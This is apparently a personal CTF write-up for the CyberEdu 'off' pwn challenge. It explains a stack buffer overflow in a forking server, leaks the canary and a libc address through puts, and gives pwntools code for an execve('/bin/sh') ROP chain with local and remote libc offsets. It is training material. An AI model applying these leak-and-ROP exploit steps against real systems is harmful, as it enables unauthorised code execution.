+++
date = '2026-01-04'
draft = false
title = 'CyberEdu off Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn", "buffer-overflow", "Format-String"]
+++


## Challenge overview

**[This application](https://app.cyber-edu.co/challenges/55a1cea0-7f21-11ea-ad6a-498299d28f9e?tenant=cyberedu)** is here just to serve your team. When you are done, you can try to exploit it. We hope is going to be much more fun.

![challenge-screenshot](pic1.png#center)

We also have canary and NX enabled. 

---

Let's look at the functions here. First we have a `main` which forks every time it's ran:

![challenge-screenshot](pic2.png#center)

Then, this function is looped:

![challenge-screenshot](pic4.png#center)

It calls some weird functions on the string:

![challenge-screenshot](pic3.png#center)

This just zeros the first 7 bytes of the string, before it's read. Interesting.

![challenge-screenshot](pic5.png#center)

This however, is our buffer overflow. Just keeps reading and writing into `a1` aka `s1` until a newline!

---

## Identifying the vulnerabilities

So how can we leak the canary, for the buffer overflow? Since we have a `puts(s1)` not a `printf(s1)`, we don't have any format string vulnerabilities, because `puts` doesn't interpret things that way. 

But what it *does* do, is just keep printing whatever until the next null byte, because that's how strings work, right? And let's take a look at the stack layout again:

`char s1[1032]; // [rsp+0h] [rbp-410h] BYREF`
`unsigned __int64 v2; // [rsp+408h] [rbp-8h]`

So, if we fill the entire `s1` with some garbage, it will keep printing until the `x00` ending of the canary. We see that `0x00` at the end, but in actual endian-ness, its at the beginning. So we need to overwrite it, to actually get anything out of it, otherwise it will consider it a null terminator. So this:

```python
p.recvuntil(b')\n')
p.sendline(b"a"*1033)

p.recvn(1033)

data = p.recvn(7)
canary = u64(data.rjust(8, b"\x00"))

print(hex(canary))
```

Gives us the canary! To find out libc, we can essentially do the same thing, but cover up everything until libc. The canary doesn't change between rounds, so that's really nice! I'm thinking, if we just keep printing values, we're going to get to `libc` eventually, right? And we did! 

```python
p.recvuntil(b')\n')
#1032 bytes s1, 8 canary, 8 rbp
#next 8 bytes, rip
#keep adding +8 til libc address
p.sendline(b"a"*(1032+8+8 +8+8))
p.recvn(1032+8+8+8+8)

data3 = p.recvn(6)
leaklibc = u64(data3.ljust(8, b"\x00"))
```

---

## The exploit

I tried a local `system(/bin/sh)`, everything *seemed* good but because of the stupid `fork()` our shell was exiting immediately. So, let's try that with `execve` then, since `fork` is an `execve` thing itself, and we might be able to replace it.

![challenge-screenshot](pic7.png#center)

I changed it to this

```python
#gadgeetsuh
pop_rdi_ret = 0x04009b3
ret = 0x4005f1
pop_rsi_r15_ret = 0x4009b1

#local
libc = leaklibc - 0x29f68
system = libc + 0x53918
execve = libc + 0xde550
binsh = libc + 0x1a7e3c

p.recvuntil(b')\n')

payload = (b"a"*1032 +
           p64(canary) +
           b"r"*8 +
           p64(pop_rdi_ret) +
           p64(binsh) +
           p64(pop_rsi_r15_ret) +
           p64(0x0) +
           p64(0x0) +
           p64(ret) +
           p64(execve)
           )
```

And we get the local flag!

![challenge-screenshot](pic8.png#center)

Now, let's connect remotely and see what we can do. The offset from the value to `libc` will most probably be different. Most likely, `2.23` or `2.27`.

![challenge-screenshot](pic9.png#center)

So it is - looks like a non-ASLR version of `libc`. But to get the offsets to `binsh` and `execve` we need to know the version. Also, we need to guess the offset of the leak.

Locally, this is how non-ASLR libc gets mapped:

![challenge-screenshot](pic10.png#center)

So I asked Claude to add a brute force to those 3 bytes. I assumed the version was `2.23`, same as [ropper](https://irinasusca.github.io/writeup-blog/posts/ropper-writeup/), which were sister and brother on the ECSC 2019 Final Phase. It *didn't* work, but it should've worked. It was Claude's fault.

I bruteforced the bytes, for both a 2.27 and a 2.23 version, but to no avail. Then, I thought, `0x7ffff7a2d830` is most likely either `libc_start_main` or `libc_start_main + ret` (if we're lucky. Sometimes it's nothing, just a completely random offset). 

Using blukat, it's exactly those versions that I tested with the bruteforce, which didn't work! Interesting.

![challenge-screenshot](libc.png#center)

Anyways, I replaced the offsets:

```python
libc = leaklibc - 0x020830
execve = libc + 0xcc770
binsh = libc + 0x18cd57
```

And we get the flag!

![challenge-screenshot](flag.png#center)

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/off.py)**.
